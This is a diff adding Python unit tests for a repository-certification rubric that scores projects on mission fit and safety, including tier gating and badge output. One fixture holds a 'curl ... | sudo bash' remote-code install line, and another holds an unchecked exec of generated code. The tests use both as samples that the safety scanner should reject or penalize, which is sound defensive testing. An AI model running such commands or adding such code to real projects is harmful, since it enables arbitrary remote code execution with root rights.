@@ -22,6 +22,7 @@ import workflows_sync as wf   # noqa: E402
 import groundbreakers as gb   # noqa: E402
 import certify as cert        # noqa: E402
 import certify_gold as gold   # noqa: E402
+import certify_repo as crepo  # noqa: E402
 import check_ingest as chk    # noqa: E402
 
 
@@ -182,6 +183,50 @@ class TestCertify(unittest.TestCase):
         scores = {"relevant": 0, "maintained": 100, "adopted": 100,
                   "works": cert.NOT_MEASURED, "safe": cert.NOT_MEASURED}
         self.assertEqual(cert.tier(scores), "🥉 Listed")
+
+
+class TestCertifyRepoRubric(unittest.TestCase):
+    def _cert(self, files: dict):
+        import tempfile, shutil, pathlib
+        d = tempfile.mkdtemp(prefix="rsi-rubric-")
+        for name, body in files.items():
+            (pathlib.Path(d) / name).write_text(body)
+        try:
+            return crepo.Certifier(pathlib.Path(d)).run()
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_decide_tier_gates_dominate_score(self):
+        self.assertEqual(crepo.decide_tier(95, True, False), "not-applicable")  # off-mission
+        self.assertEqual(crepo.decide_tier(95, False, True), "rejected")        # unsafe
+        self.assertEqual(crepo.decide_tier(80, True, True), "certified")
+        self.assertEqual(crepo.decide_tier(60, True, True), "provisional")
+        self.assertEqual(crepo.decide_tier(40, True, True), "rejected")
+
+    def test_critical_pattern_is_auto_reject(self):
+        r = self._cert({
+            "README.md": "An AI scientist that runs autonomous experiments and hypothesis search.",
+            "install.sh": "curl https://x.io/i.sh | sudo bash\n",
+        })
+        self.assertEqual(r["dimensions"]["safety"]["score"], 0)
+        self.assertFalse(r["safety_ok"])
+        self.assertEqual(r["tier"], "rejected")
+
+    def test_self_exec_without_checker_is_penalized(self):
+        r = self._cert({"agent.py": "exec(compile(generated_code, 'x','exec'))  # self-improving loop\n",
+                        "README.md": "recursive self-improvement agent"})
+        self.assertLessEqual(r["dimensions"]["safety"]["score"], 45)
+
+    def test_offmission_repo_is_not_applicable(self):
+        r = self._cert({"README.md": "A static personal blog built with Jekyll.", "main.py": "print(1)"})
+        self.assertFalse(r["on_mission"])
+        self.assertEqual(r["tier"], "not-applicable")
+
+    def test_badge_schema(self):
+        b = crepo.badge({"tier": "certified", "score": 90})
+        self.assertEqual(b["schemaVersion"], 1)
+        self.assertEqual(b["color"], "brightgreen")
+        self.assertIn("90/100", b["message"])
 
 
 class TestCheckIngest(unittest.TestCase):
